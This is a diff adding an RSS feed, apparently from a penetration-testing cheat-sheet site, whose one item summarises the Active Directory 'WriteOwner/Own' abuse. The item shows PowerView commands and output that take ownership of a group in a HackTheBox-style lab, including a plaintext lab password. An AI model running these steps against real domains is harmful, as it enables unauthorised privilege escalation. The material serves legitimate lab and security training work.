@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Own on TLDRBins</title>
+    <link>https://tldrbins.github.io/@own/</link>
+    <description>Recent content in Own on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@own/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Abuse #1 : Change Owner of the Group/User Linux Windows 1. Powerview.py # Password powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; $ powerview &amp;#39;CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB&amp;#39; ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:&amp;lt;auto&amp;gt;] ╰─PV ❯ # NTLM powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; 2. Change Owner Set-DomainObjectOwner -TargetIdentity &amp;#39;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#39; -PrincipalIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:&amp;lt;auto&amp;gt;] ╰─PV ❯ Set-DomainObjectOwner -TargetIdentity &amp;#39;Management&amp;#39; -PrincipalIdentity &amp;#39;judith.mader&amp;#39; [2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103 [2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .</description>
+    </item>
+  </channel>
+</rss>
